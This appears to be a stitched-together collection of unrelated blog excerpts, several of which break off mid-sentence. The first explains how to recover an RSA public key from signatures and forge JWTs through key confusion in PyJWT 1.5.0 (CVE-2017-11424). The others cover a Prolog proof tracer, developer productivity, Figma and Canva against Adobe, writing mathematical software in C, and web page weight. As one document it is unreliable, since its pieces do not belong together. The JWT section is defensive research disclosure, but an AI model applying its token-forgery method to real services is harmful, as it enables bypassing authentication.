<ul><li>An RSA public key is an <em>(n,e)</em> pair of integers, where <em>n</em> is the modulus and <em>e</em> is the public exponent. Since <em>e</em> is usually some hardcoded small number, we are only interested in finding <em>n</em>.</li><li>Although RSA involves large numbers, really efficient algorithms exist to find the GCD of numbers <a href="https://en.wikipedia.org/wiki/Euclidean_algorithm">since the ancient times</a> (we don’t have to do brute-force factoring).</li><li>Although the presented method is probabilistic, in practice we can usually just try all possible answers. Additionally, our chances grow with the number of known message-signature pairs.</li></ul>



<p>In our case, we could always recover public keys with just two signatures. At this time we had a quick and dirty implementation based on the <a href="https://pypi.org/project/gmpy2/"><em>gmpy2</em></a><em> </em>library that allowed us to work with large integers and modern, efficient algorithms from Python. </p>



<h2> JOSE’s curse</h2>



<p>It took a couple of weeks of management meetings and some sleep deprivation to strike me: the dirty little code we wrote for that custom RSA application can be useful against a more widespread technology: JSON Web Signatures, and JSON Web Tokens in particular. </p>



<p>Design problems of the above standards are<a href="https://twitter.com/FiloSottile/status/1229805464810074114"> well-known</a> <a href="https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid">in security circles</a> (unfortunately these concerns <a href="https://twitter.com/buherator/status/1357822697531723779">can’t seem to find their ways to users</a>), and <em>alg=”none”</em> fiascos <a href="https://www.howmanydayssinceajwtalgnonevuln.com/">regularly deliver</a> facepalms. Now we are targeting a trickier weakness of user-defined authentication schemes: confusing symmetric and asymmetric keys.</p>



<blockquote><p>If you are a developer considering/using JWT (or anything <a href="https://access.redhat.com/blogs/766093/posts/1976593">JOSE</a>), <strong>please</strong> take the time to at least read <a href="https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid">this post</a>! Here are some <a href="https://twitter.com/FiloSottile/status/1229815043988033536">alternatives</a> too. </p></blockquote>



<p>In theory, when a JWT is signed using an RSA <em>private</em> key, an attacker may change the signature algorithm to HMAC-SHA256. During verification the JWT implementation sees this algorithm, but uses the configured RSA <em>public</em> key for verification. The problem is the symmetric verification process assumes that the same <em>public</em> key was used to generate the MAC, so if the attacker has the RSA <em>public</em> key, she can forge the signature too. </p>



<p>In practice however, the public key is rarely available (at least in a black-box setting). But as we saw earlier, we may be able to solve this problem with some algebra. The question is: are there any practical factors that would prevent such an exploit?</p>



<h2>&nbsp;CVE-2017-11424</h2>



<p>To demonstrate the viability of this method we targeted a <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-11424">vulnerability</a> of PyJWT version 1.5.0 that allowed key confusion attacks as described in the previous section. The library uses a blacklist to avoid key parameters that “look like” asymmetric keys in symmetric methods, but in the affected version it <a href="https://github.com/jpadilla/pyjwt/pull/277">missed</a> the “BEGIN <strong>RSA</strong> PUBLIC KEY” header, allowing <a href="https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail">PEM</a> encoded public keys in the <a href="https://tools.ietf.org/html/rfc3447#appendix-A.1.1">PKCS #1 format</a> to be abused.  (I haven’t checked how robust key filtering is, deprecating the verification API without algorithm specification is certainly the way to go)</p>



<p>Based on the <a href="https://pyjwt.readthedocs.io/en/stable/usage.html">documentation</a>, RSA keys are provided to the encode/decode API’s (that also do signing and verification) as PEM encoded byte arrays. For our exploit to work, we need to create a perfect copy of this array, based on message and signature pairs. Let’s start with the factors that influence the signature value:</p>



<ul><li><strong>Byte ordering:</strong> The byte ordering of JKS’s integer representations matches <em>gmpy2</em>‘s.</li><li><strong>Message canonization:</strong>&nbsp;According to the JWT standard, RSA signatures are calculated on the SHA-256 hash of the Base64URL encoded parts of tokens, no canonization of delimiters, whitespaces or special characters is necessary.</li><li><strong>Message padding:</strong> JKS prescribes deterministic PKCS #1 v1.5 padding. Using the appropriate low level crypto API’s (this took me a while, until I found <a href="http://ratmirkarabut.com/articles/ctf-writeup-google-ctf-quals-2017-rsa-ctf-challenge/">this CTF writeup)</a> will provide us with standards compliant output, without having to mess with ASN.1. </li></ul>



<p>No problem here: with some modifications of our original code, we could successfully recreate the Base64URL encoded signature representations of JWT tokens. Let’s take a look at the container format (<a href="https://tls.mbed.org/kb/cryptography/asn1-key-structures-in-der-and-pem">this guide</a> is a great help):</p>



<ul><li><strong>Field ordering:</strong> Theoretically we could provide <em>e</em> and <em>n</em> in arbitrary order. Fortunately PKCS #1 defines a strict ordering of parameters in the ASN.1 structure. </li><li><strong>Serialization:</strong> DER (and thus PEM) encoding of ASN.1 structures is deterministic. </li><li><strong>Additional data:</strong>&nbsp;PKCS #1 doesn’t define additional (optional) data members for public keys. </li><li><strong>Layout:</strong> While it is technically possible to parse PEM data without standard line breaks, files are usually generated with lines wrapped at 64 characters.</li></ul>



<p>As we can see, PKCS #1 and PEM allows little room for changes, so there is a high chance that if we generate a standards compliant PEM file it will match the one at the target. In case of other input formats, such as JWK, flexibility can result in a high number of possible encodings of the same key that can block exploitation.</p>



<p>After a lot of cursing because of the bugs and insufficient documentation of <em>pyasn1</em> and <em>asn1</em> packages, <em><a href="https://asn1tools.readthedocs.io/en/latest/">asn1tools</a></em> finally proved to be usable to create custom DER (and thus PEM) structures. The generated output matched perfectly with the original public key, so I could successfully demonstrate token forgery without preliminary information about the asymmetric keys:</p>







<p>We tested with the 2048-bit keys from the JKS standard: it took less than a minute on a laptop to run the GCD algorithm on two signatures, and the algorithm produced two candidate keys for PKCS #1 which could be easily tested.</p>



<p>As usual, <a href="https://github.com/silentsignal/rsa_sign2n">all code is available on GitHub</a>. If you need help to integrate this technique to your Super Duper JWT Haxor Tool, use the Issue tracker!</p>



<h2>Applicability</h2>



<p>The main lesson is: one should not rely on the secrecy of public keys, as these parameters are not protected by mathematical <a href="https://en.wikipedia.org/wiki/Trapdoor_function">trapdoors</a>.</p>



<p>This exercise also showed the engineering side of offensive security, where theory and practice can be far apart: although the main math trick here may seem unintuitive, it’s actually pretty easy to understand and implement. What makes exploitation hard, is to figure out all those implementation details that make pen and paper formulas work on actual computers. It won’t be a huge surprise to anyone who worked with digital certificates and keys that at least 2/3 of the work involved here was about reading standards, making ASN.1 work, etc. (Not to mention constantly converting byte arrays and strings in Python3 :P)  Interestingly, it seems that the stiffness of these standards makes the format of the desired keys more predictable, and exploitation more reliable! </p>



<p>On the other hand, introducing unpredictable elements in the public key representations can definitely break the process. But no one would base security on their favorite indentation style, would they?</p>

<h3 id="what-is-this">What is this?</h3>

<p>The above is basically Jens Otten’s prover from the “Build Your Own First-Order Prover” at CADE 2019 <a href="http://jens-otten.de/tutorial_cade19/">http://jens-otten.de/tutorial_cade19/</a> in particular lecture 2.
I added a tracing parameter to it so that I can draw the sequent using <a href="https://www.mathjax.org/">MathJax</a>.
Note that my javascript is looking for a query variable called <code>Proof</code> in order to draw the output.</p>

<h3 id="what-is-a-proof-anyway">What is a Proof Anyway?</h3>

<p>Proofs are actions or things that convince you of something.</p>

<p>How’s that for really nailing it down?</p>

<p>Some examples of stuff that might be considered “proof”:</p>

<ul>
  <li>A solution to a set of linear equations is proof that they can be solved.</li>
  <li>A dual vector is proof of optimality of a linear program.</li>
  <li>A convincing English paragraph is proof.</li>
  <li>Use of a cryptographic key can prove your identity.</li>
  <li>A trace of a complete search program that failed to find a solution is proof of its nonexistence.</li>
</ul>

<p>There is a sense that for something to be a proof requires it to be relatively easy to check the proof.</p>

<p>A narrower view of proof is that proof is a pile of formal manipulations of syntax.
One thing that you can prove is the truth of a proposition combined using logical connectives.</p>

<p>A <a href="https://en.wikipedia.org/wiki/Sequent">sequent</a> is a structure that represents a partial state of a proof. It contains a breakdown of formula.
$ A,B,C,… \vdash D,E,F,…$. Spiritually a sequent represents the knowledge or <a href="https://en.wikipedia.org/wiki/Judgment_(mathematical_logic)">judgement</a> that the conjunction of the antecedents implies one of the consequents, but a sequent could be just considered pure syntax, merely a dead data structure to hold a pile of meaningless symbols.</p>

<p>The sequent proof viewed from the bottom up is a stepwise breakdown of formula until they are trivially true.
From the top down it is the combination of simpler facts into more complicated ones.</p>

<p>It’s all a very funny shell game. Somehow proofs take small steps that each feel so simple that they aren’t doing anything and build up a statement that is non obvious.</p>



<p><a href="https://www.metalevel.at/prolog">Prolog</a> is neat. Here I’m using <a href="http://tau-prolog.org/">Tau Prolog</a>, which a prolog that is written in Javascript.
Prolog is roughly what you get when you add search and unification as primitive constructs in a language.</p>

<p>Prolog has multiple readings, which makes it pretty special.
In one reading Prolog formula are themselves statements of axioms of a particular form (<a href="https://en.wikipedia.org/wiki/Horn_clause">Horn clauses</a>) that lends itself to a simple proof procedure.
It also has a fairly declarative reading as a nondeterminstic match statement that tries each match in turn.
Another interesting one is to consider <code>:-</code> to be the horizontal bar of an inference rule.</p>

<p>One model of the state of a prolog execution is as a sequent. The trace of prolog execution is is a sequent style proof. See <a href="https://www.amazon.com/Programming-Higher-Order-Logic-Dale-Miller/dp/052187940X">Nadathur and Miller</a> or Frank Pfenning’s <a href="http://www.cs.cmu.edu/~fp/courses/15317-f17/">notes</a> for more</p>

<p>Notable tricks from the <a href="http://jens-otten.de/tutorial_cade19/">Jens Otten</a> tutorial (which I highly recommend):</p>
<ol>
  <li>Invertible rules. Rules that are reversible (in what sense?) can be eagerly applied. Use cuts !</li>
  <li>Using prolog variables and <code>copy_term</code>. Prolog variables may not work for higher order logic, but they do work for first order, since we’re never substituting a bound variable inside another. Prolog variables are a different face . The trick to Keep some terms around is to include a Freevar list in copy term.</li>
  <li>Skolemization</li>
  <li>Iterative deepening. No surprise here. This is a pretty standard way of making prolog search complete.</li>
</ol>

<p>For more on these tricks, it is worthwhile to examine the leanTAP paper <a href="https://formal.iti.kit.edu/beckert/leantap/">https://formal.iti.kit.edu/beckert/leantap/</a>.</p>

<p>There is a little bit of glue code in javascript to call the Tau Prolog solver. I used HTML textarea as input elements and sort of willy nilly grabbed from them.</p>

<h3 id="the-pretty-printer">The Pretty Printer</h3>

<p>The pretty printer is straightforward and a little janky. I am using the bussproofs package that is included in mathjax to write out my proofs trees nice.
<a href="http://docs.mathjax.org/en/latest/input/tex/extensions/bussproofs.html?highlight=bussproofs">http://docs.mathjax.org/en/latest/input/tex/extensions/bussproofs.html?highlight=bussproofs</a></p>

<p>Bussproofs flatten the tree as a post order traversal, meaning you write a node after all it’s children have been visited. It is most easily seen by examining this example. You can read more here <a href="https://www.math.ucsd.edu/~sbuss/ResearchWeb/bussproofs/BussGuide2_Smith2012.pdf">https://www.math.ucsd.edu/~sbuss/ResearchWeb/bussproofs/BussGuide2_Smith2012.pdf</a>.</p>

<p>Traversing through returned Tau Prolog objects is pretty straightforward. There are <code>id</code> fields that hold the name of the functor and <code>args</code> is an array holds the children. I figured it out via judicious use <code>console.log</code> as Tau Prolog doesn’t have the most documentation I’ve ever seen.</p>

There are a lof of productivity tips and tricks for how to time manage and become better and more productive developer. This is the first part of a hopefully two where I will talk more about application and the workflows I’ve been using and changing up - and how I test what productivity hacks work and which do not.
I&nbsp;want&nbsp;to&nbsp;start&nbsp;with&nbsp;some&nbsp;basics&nbsp;in&nbsp;this&nbsp;blogpost.</p><h2 id="what-is-productivity"><strong>What&nbsp;is&nbsp;productivity?</strong></h2><p>The&nbsp;<a href="https://en.wikipedia.org/wiki/Productivity">Wikipedia</a> definition is "<strong><strong>Productivity describes various mesaures of the efficency of production.</strong></strong>".&nbsp;If&nbsp;productivity&nbsp;is&nbsp;the&nbsp;measure&nbsp;of&nbsp;efficency,&nbsp;what&nbsp;could&nbsp;that&nbsp;be&nbsp;in&nbsp;the&nbsp;context&nbsp;of&nbsp;development?&nbsp;Lines&nbsp;of&nbsp;Code?&nbsp;How&nbsp;much&nbsp;tickets&nbsp;did&nbsp;you&nbsp;move?</p><p>I&nbsp;also&nbsp;really&nbsp;like&nbsp;the&nbsp;“Productivity&nbsp;equiation”&nbsp;from&nbsp;Ali&nbsp;Abdaal:</p><blockquote><p><strong>Productivity&nbsp;=&nbsp;Useful&nbsp;output&nbsp;/&nbsp;time&nbsp;x&nbsp;f&nbsp;(where&nbsp;f&nbsp;is&nbsp;the&nbsp;‘fun&nbsp;factor’)</strong></p></blockquote><p>If you increase the “f” or “fun” constant in everything you do it amplifies your productivity! It will make you more motivated, more consistent and in the end more productive.</p><p>As a developer, you mostly get the fun factor when learning as new language, a new skill or start to work on a new project. I can tell from my experience I’ve been stuck in a job where the tech stack was Jquery and NodeJS backend. At the first few month I was fine with it, I learned Jquery more deeply and got better with understanding NodeJS, but seeing other colleagues work with NextJs, React, GraphQL kinda put me off my own project and I got a feeling that I’m missing out and that the thing I do are not relevant for my future career or my future development. </p><p>I asked to get moved to the new projects, but I did not get a concrete timeline on when that could happen. After a while, even tho I work with the same technologies for ~1.5 years, my productivitry fell. The reason for that was my work and the technologies I’ve been working with. I did not get challanged, I did not have any fun working on the same bugs over and over, and my productivity fell more and more. </p><p>So the options I was left with, change the technologies to something I was having fun - but wait for the company to decide when or leave the company, and those are bad options. </p><h2 id="how-to-increase-productivity">How to Increase productivity</h2><p><strong>Habits</strong></p><p>Habits are an “easy” thing to change and which result in the biggest payoff. If you can change your habits you can become a better developer period. I can give you a silly example from when I started working with Git the first time. </p><p>As junior dev I’ve had the issue to push things that do not needed to be pushed in the repo, be it some .env file which was not in gitignore or some test functions I’ve written and did not delete at the time of creating a PR. I would see those things when I already created my pull request and it would result in my senior colleagues pointing out the obvious and “wasting” their and mine time to remove a function or file which should not be there in the first place. So I’ve set a small pre-commit hook as a bash script (The idea for it can be found on this <a href="https://blog.almin.dev/posts/2021-01-18/%5Bhttps://stackoverflow.com/questions/45416049/how-to-make-a-git-pre-commit-hook-that-checks-the-commit-message%5D(https://stackoverflow.com/questions/45416049/how-to-make-a-git-pre-commit-hook-that-checks-the-commit-message)">link</a>)which echoes(Screams) a message: “CHECK YOUR FILES” everytime I would make a commit, so I’m reminded to check on the files I’m trying to push. Over time that helped me develop a habit to always check the code before pushing if there are any files that are unnecessary or just test code which should be removed. </p><p>This is just a small example of how to “actively” change some of your habits and making yourself aware of things that need to be done. </p><p><strong>Productive downtime</strong></p><p>Many productivity books recommend a “productive downtime” which is just simple as it sounds. Stop whatever you are banging your head with go for a walk and come back in 15 minutes. The famous pomodoro technique (which I will outline more in my second post) is something which takes advantage of this. </p><p>Also, I think, every dev can relate to having a super hard problem which you are working on and then after going home, sleeping and getting back at work in the morning, the problem is solved in 10 minutes. </p><p><strong>External storage</strong></p><p>Since I do not trust my brain at all with keeping important information for longer then 30 minutes, one of the most important thing at least for me, is being able to store things not in my head but somewhere external. Like an external HDD, you offload your brain and store the data in an external place like a Note taking app - calendar or even manual notebooks. I always liked the idea to use digital notebooks and calendars to plan and to store as much data as possible, because I will probably forget it if I try to remember something. </p><p>Currently I’m using the Notion app, which is one of the best note taking apps I’ve used (and I’ve used a lot of them) I currently use to make for example a “Engineering Wiki” where I store all the new technologies, scripts and tools I write, into it and make it searchable. Because I for sure won’t remember everything, because my brain is so bad at it. I like to make notes about knowledge which will probably not change, for example configurating a apache web server, setting up docker etc. and just offload these things into a notebook. </p><p>So these are some of my basics of productivity around which I’m working with. Next time, I probably will write more about tools and how to implement some workflows which I’m using for productivity.</p></div></article></div></div>]]>

<p><strong>How Figma and Canva are taking on Adobe—and winning</strong></p>



<p>In 2010, Photoshop was ubiquitous. Whether you were editing a photo, making a poster, or designing a website, it happened in Photoshop.&nbsp;</p>



<p>Today, Adobe looks incredibly strong. They’ve had spectacular stock performance, thanks to clear-eyed management who’ve made bold bets that have paid off. Their transition to SaaS has been seamless, for which the public markets have rewarded them handsomely. And they’re historically one of the <a href="https://en.wikipedia.org/wiki/List_of_acquisitions_by_Adobe">best companies at M&amp;A</a>; their product lineup is a testament to their ability to acquire new product lines and integrate them well into their multi-product ecosystem. Perhaps most importantly and least appreciated, they have dramatically sped up the cadence of their internal product development process and feedback loop. Like Microsoft, they have successfully shifted from a legacy company operating on an annual (or longer) release schedule to a truly cloud company shipping updates at a sub-weekly pace.</p>



<p>Nevertheless, there are a few segments of design where they’re no longer the market leader. Companies like Figma, Sketch, and Canva are examples of products that have been able to become top products despite Adobe’s ubiquity in all things design. Figma showed up in Adobe’s annual report for the first time in <a href="https://www.bamsec.com/filing/79634320000013">2019</a>. They reprised in <a href="https://www.bamsec.com/filing/79634321000004">2020</a>, and I’m not uncertain they will continue to be in it going forward.</p>



<p>How should we understand these market transitions and why these young companies are able to thrive, even against a strong incumbent like Adobe?</p>



<p>These companies have distinct atomic concepts from Adobe. The primitives that their products are built around are fundamentally different from those of Adobe’s product lineup. It’s these different fundamental atomic concepts that turn Adobe’s advantage of an established product and existing userbase into a weakness that hinders their ability to counter these upstarts. The opportunity for these new atomic concepts to thrive is driven by the new use cases and types of users unearthed during market transitions.</p>



<p>Understanding the phases of market transition and what drives them is a universal process worth examining.</p>



<h2>New use cases: designing for digital</h2>



<p>For most markets, there are advantages to being an incumbent. Markets converge as companies arrive at the preference frontier of customers. This leaves little potential energy for new startups to take advantage of.</p>



<p>Market entropy is good for new entrants.</p>



<p>It’s not impossible to break into a market by brute force, but it’s hard. Very hard. Most successful companies, especially startups, have found tailwinds to harness that help pull them forward.</p>



<p>Changing customer needs are the largest source of entropy in markets. When customer needs rapidly change, there is less advantage in being an incumbent. Instead, legacy companies are left with all the overhead and a product that no longer is what customers want.</p>



<p>There are many causes of changing customer needs. Often there are new and growing segments of customers with different use cases. Existing products may work for them, but they aren’t ideal. The features they care about and how they value them are very different from the customers the legacy company is used to. Companies resist changing core parts of their product for every new use case since it’s costly in work, money, and attention. But every once in a while, what was once a small use case grows into one large enough to support its own company.</p>



<p>Other times the scale or dynamics of a market shift enough to make a product no longer work despite having been a great fit. Companies are often caught flat-footed by these situations because what they have done successfully for years suddenly starts to falter—and they aren’t sure why. Ebay is a good example of this. Their decentralized auction model was very good in a nascent internet economy when there was a scarcity of items being sold online. Once ecommerce became commonplace, price and speed became much more important factors and Ebay’s decentralized model was at a disadvantage. Amazon was much better at building economies of scale in this post-liquidity ecosystem.</p>



<p>Another source is when the customers themselves change. Often the function of a tool remains the same, but the type of user changes. These new types of customers often have different things they care about and resulting product needs.</p>



<p>The internet drove entirely new design use cases. Photoshop was built for editing photos and images. It’s a powerful tool that operates at the pixel level. However, many of these new uses weren’t about image manipulation. Images were a component—not the essence—of the job users were trying to accomplish.</p>



<p>For some users, this was designing digital products. Designers at software companies or any company with a website wanted to create the websites and software products they worked on. This is less about image manipulation and more about designing the UI and UX of these digital products. Vectors are more important than raster graphics. The complexity and process of designing these high-value designs also got increasingly more sophisticated. These designers worked with teams of other designers and non-designers. Their designs are part of a larger product development process and what mattered wasn’t just making a design, but how that the entire process could be improved to make collaboration easier and handoff of designs better. Iteratively.</p>



<p>The complexity of the designs and the components in the resulting code became more complex, too. The need for their tools to have a higher-level understanding of the components and variants became more important. It’s increasingly useful for designs to understand the same concepts and abstraction levels as the HTML and CSS in the resulting end product.</p>



<p>For some users, this was designing content for social platforms, digital ads, or even wedding invitations. These were often made in Photoshop, but again, pixels are the wrong abstraction level. Images are not the sole component; they are just past of a larger design that includes graphics, text, and more. Similarly, the customers are very different. Many of the people now doing what is, in essence, design work don’t think of themselves as designers. They just have a very specific thing they want to create, with the least friction possible.</p>



<p>The internet dramatically scales up the volume and type of new use cases for design. In many ways, this helps Adobe. With platforms like Instagram, the number of people editing photos has expanded by many orders of magnitude. While editing on platforms like Instagram may have increased significantly, Adobe has been a huge beneficiary of the internet and the shift to cloud—and their <a href="https://www.google.com/finance/quote/ADBE:NASDAQ">stock price</a> is a testament to this.</p>



<p><em>[KK Note: Platforms like Instagram strapping editors onto their social platforms and eating into Lightroom from the bottom up is well worth its own discussion. And perhaps someone will convince Mike Krieger to do the definitive piece on that.]</em></p>

But it’s also building new worlds? I’m going to need a refresher on remembering the Andreessen Horowitz talking points</figcaption></figure>



<p>This is even more true in video. There are orders of magnitude more video creators as the ability to record video has become ubiquitous and the platforms where video is the default format have grown. Even more striking, many of the dominant video platforms—like Youtube—are purely distribution focused. They don’t even have any editing capabilities. Instead, companies like Adobe end up being large beneficiaries of this need.</p>



<p><em>[KK Note: Platforms like Youtube still having not built any semblance of an editor into their platform is *also* well worth its own discussion. I’d say we’ll never know what could be, but then I look at TikTok and all is right with the world.]</em></p>



<p>But Adobe hasn’t captured it all. And in many of these new emergent use cases and customer types, Adobe has lost the lead to new startups.</p>



<h2>Tapping into the right level of abstraction</h2>



<p>The best products map to how customers think about their workflow. They match the abstraction level of their customers: not too high that it’s unusable, but not too low that it’s hard to use easily or extend in more complex ways.</p>



<p>They choose the right atomic concepts.</p>



<p>These are the core concepts around which the entire product is built. They not only align with how customers think of their workflow, but often crystallizes for customers how they ought to. Great atomic concepts are honed and then extended and built upon in more complex compounds that…well for lack of a better word…<em>compound</em>.</p>



<p>Similar companies often have slightly different atomic concepts that end up making them meaningfully distinct. Photoshop is focused on pixels and images. Its focus is on editing images and pictures. And its functions operate by transforming them on a pixel level.</p>



<p>Illustrator is similar, but it operates on vectors, not pixels. This is a higher level abstraction. Neither is better or worse, they are just more suited to different use cases. Photoshop is better for modifying images, while illustrator is built for designs where scale-free vectors are best.</p>



<p>Sketch, like Illustrator, is vector based. But is designed for building digital products which means things like operating at a project level. It is not individual designs, but crafting entire products and user interfaces—and the needs for repeatability and consistency inherent to that.</p>



<p>Figma builds on Sketch’s approach, but also includes a greater focus on not just projects but the entire collaborative process as the relevant scope. Similarly, it also treats higher level abstractions like plugins, community, and more as equally important concepts.</p>



<p>Canva is similar to Photoshop and Illustrator, but its users aren’t designers who care about low level tools. Instead Canva’s core atomic concepts are around the different …</p></div></div>

<p><i>January 28, 2021</i></p>


<p>
I sometimes get asked whether it makes sense to implement <i>XYZ</i> in C,
especially compared to using some language that is more advanced
(C++, Julia, Python, Haskell or Rust) or perfect (Lisp).
</p>

<p>
I suspect that a lot of people are a bit intimidated by C and believe that
it requires some kind of superhuman hacker ability to wield.
That's at least how I felt about C
before I started really using it.
Other people believe that C is a horrible
language that inherently produces defective software
and which should be cast back into the abysses of UNIX from whence it came
(they are not necessarily wrong).
I personally think that C's simplicity
is an advantage that
often outweighs its disadvantages,
but there are clearly domains where C is a bad choice.
In domains where C works well, there are also good
alternatives, and choosing C then just comes
down to personal preference.
</p>

<p>
In this post, I will attempt to answer why you should or shouldn't use C,
and I will give some general advice that may be helpful if you end up using C.
This is based on my own experience developing
mathematical software in C (mainly <a href="https://flintlib.org/">Flint</a>,
<a href="https://arblib.org/">Arb</a> and <a href="https://fredrikj.net/calcium/">Calcium</a>), in an academic setting.
This experience will not necessarily transfer well to other settings.
</p>

<h2>Why you should use C</h2>

<p>Why should you write your next library
in C, or perhaps contribute to some existing C library?
I will offer four simple arguments.</p>

<h3>Availability</h3>

<p>
Reason number one is that C is stable, universally supported,
and has reliable tooling.
Your plain C library will compile and run
almost anywhere, can be developed anywhere,
and will require minimal dependencies. Users of virtually
any other programming language can easily interface with your code
through their language's C foreign function interface,
at least if you take basic precautions to design a decent external API.
Not only will your C library run anywhere
<i>right now</i>; it will still run 20 years from now,
and if you had a time machine, probably 20 years ago too.
</p>

<h3>Speed</h3>

<p>
Reason number two is that it will run very, very fast.
I don't just mean that
benchmark loops will
go <i>VROOOM</i>; your software will also start up instantly
(no need to load a bloated dynamic runtime or JIT-compile code),
and there will be no hidden overhead for things like automatic
garbage collection
(well-written C code spends a negligible fraction of its overall
execution time doing allocations and deallocations,
precisely at the points in time where they are needed).
This is, of course, <i>if you know what you are doing</i>.
Writing efficient C, while not exactly rocket surgery, does require
proficiency with the language and a solid understanding
of fundamental algorithms and data structures.
</p>

<h3>Readability</h3>

<p>Reason number three is that you will be able to read your
own code, and others will incidentally be able to read it too.
Some people are going to disagree with me here, arguing that higher
level languages are better for readibility.
That is trivially true in the sense that higher level languages
provide abstractions that allow expressing complex ideas more
succinctly.
A simple example is providing operator overloading so that you
can write <tt>a + b * c</tt> instead of something like <tt>add(a, mul(b, c))</tt>,
or in C, often something even more verbose like the following typical <a href="https://gmplib.org/">GMP</a> snippet:
</p>

<pre>mpz_t tmp;
mpz_init(tmp);
mpz_mul(tmp, b, c);
mpz_add(a, a, tmp);
mpz_clear(tmp);
</pre>

<p>This
would seem like an especially important point for mathematical software.
However, hiding details can also
hide useful information.
In an object-oriented, memory-managed,
operator-overloaded language, information that may be
hidden by the infix arithmetic notation includes
where and how memory is allocated;
how methods are resolved and how coercions are made
when the operands have different types
or when class hierarchies are involved;
what algorithms are used to perform the arithmetic operations
(irrelevant for machine integers, but potentially very important
details if you are multiplying huge matrices).
The infix notation is usually good for understanding the intent
of the code, but something more verbose can be
better for reasoning about performance
and for dealing with cracks in the abstractions.
Put concisely, C is good for making implementation details explicit
when implementation details matter.
</p>

<p>Viewed in this light, C's omission of certain conveniences
such as namespaces, overloading and generics is actually a feature,
not a bug.
Figuring out what any given piece of C code does tends to be
a straightforward process because of, and not despite, the fact
that it is verbose: everything that happens is explicit and functions and types can only have a
single definition which is easy to grep for.
I can't recall ever really having trouble diving into someone else's C code
or reading C code that I wrote a long time ago.
The same can't be said for Python, for example, where it can be
a real struggle to understand which method on which class gets called and how
and when and in what context.
Granted, you <i>can</i> obfuscate C code by abusing macros, doing
complicated runtime generics, or using cryptic names,
but even something like the rather dense
and idiosyncratic <a href="https://pari.math.u-bordeaux.fr/">Pari/GP</a>
codebase is penetrable after a short familiarization process.
</p>

<h3>Educational value</h3>

<p>
Reason number four is that you will learn a lot in the process of writing C.
Implementing algorithms in C instead of a higher-level language
can lead to a deeper understanding since you have
to do more of the groundwork yourself. You will also probably have to
think things through more carefully; when I write Python, I can often
get away with implementing something half-broken and fixing it piecemeal,
but C more often forces me to be correct up-front.
</p>

<h2>Why you shouldn't use C</h2>

<p>Now on to the far more interesting case <i>against</i> C,
or rather, a fair and balanced evaluation of C's weaknesses.</p>

<h3>Mathematical understanding</h3>

<p>
Since we are talking about <i>mathematical</i> software, it is likely
that implementing <i>XYZ</i> actually involves solving two problems: understanding the
mathematics of <i>XYZ</i>, and translating that understanding
to concrete algorithms and code. If you don't understand the mathematics,
you might be better off exploring the problem
using a high-level language or a computer algebra system
and postponing a C implementation (if you need it) until
your mathematical understanding has crystallized.
If you decide to start a C project right away
to figure out the mathematics in parallel with the software development,
you will probably still want to use
another language for experimentation (more on this later).
Be prepared to continuously reevaluate your assumptions, and
expect having to rewrite code from scratch more than once.
</p>

<h3>Portability and deployment</h3>

<p>The following comments mainly apply to starting a new project
intended to be used by other people.</p>

<p>
In practice, the claims about C's amazing portability are somewhat
exaggerated.
As a C library maintainer,
you will have a lot of fun gradually discovering
new inconsistencies in build systems and standard library implementations
between different operating systems and hardware configurations.
You will probably run into the occasional rare compiler bug (though C might be
one of the better languages in this regard).
Over time, your header files will probably accumulate hundreds
of <tt>#ifdef</tt>s intended to work around compatibility problems
that may or may not still exist.</p>

<p>The large majority of your prospective users will probably
be unable or unwilling to
build and install your library from source, so
you will either have to distribute binaries yourself or
rely on distribution via third-party
package repositories such as those of the major Linux distributions.
In the interest of stability
or because of a lack of manpower,
such repositories typically keep software 1-10 years out of date.
(Yes, I once found <a href="https://travis-ci.org/">Travis CI</a>'s default Ubuntu configuration sporting a nearly 10 years old
Flint-1.6.)
In other words, you can't count on users having access to the latest features
and bugfixes
in your library, and it goes without saying that you should work
very hard to preserve backward compatibility.
I suppose this lag in deployment has one advantage for reproducible research: if
you submit a journal paper based on the cutting edge version of your software,
readers will probably still have access to that version in Debian LTS
by the time the publishing process completes three years later
(hi, <a href="https://dl.acm.org/journal/toms">ACM Transactions on Mathematical Software</a>).</p>

<p>
A good idea for widespread deployment is to get your mathematical library into
<a href="https://www.sagemath.org/">SageMath</a>.
SageMath is maintained by a large community
and tested on many platforms, and packages in SageMath are usually only several months out of date.
</p>

<p>Deploying software written in more modern programming languages is
typically easier since they have more sane build processes
and standard libraries that eliminate most of C's platform-dependent
headaches.
Nowadays many languages also have their own easy-to-use packaging systems
and centralized package repositories.
In practice, the best languages for portability and easy distribution
right now are probably (1) JavaScript (in the browser), and (2) Python.
Julia is not far behind, and in many respects better designed than Python,
but Python currently has the benefit of being preinstalled on many systems.
All of this being said,
<a href="https://emscripten.org/">Emscripten</a> is a promising
alternative distribution method for C code which may change the equation,
especially if you think a browser-based interface makes more
sense than linking together libraries and running code
in the terminal in the traditional way.
</p>

<h3>Safety</h3>

<p>
C has a reputation of leading to buggy, crash-prone software
and disastrous security vulnerabilities.
Commonly criticized aspects of C include its
manual memory management, weak type system, and
deviously undefined or implementation-defined semantics.
This reputation is generally deserved,
though in C's defense, I think the problems often</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>The average web page takes seven seconds to load on a desktop device and 20 seconds on mobile. It makes 70 HTTP requests and downloads more than 2MB of data including:</p><ul><li>20Kb of HTML</li><li>60Kb of CSS over seven files</li><li>430Kb of JavaScript in 20 files</li><li>26 images totalling 900Kb</li></ul><p><a href="https://httparchive.org/reports/page-weight" target="_blank" rel="noreferrer"><em>Source: httparchive.org</em></a>
Slow sites are bad for:</p><p><strong>Users</strong>
Downloading a <strong>single page</strong> on a <a href="https://whatdoesmysitecost.com/" target="_blank" rel="noreferrer">mobile phone costs</a> $0.29 in Canada, $0.19 in Japan, and $0.13 in the US. Those browsing in Vanuatu, Mauritania, or Madagascar pay more than 1% of their daily income.</p><p><strong>Business</strong>
Slow sites rank lower in search engines, incur higher hosting costs, are more difficult to maintain, and reduce conversion rates.</p><p><strong>The environment</strong>
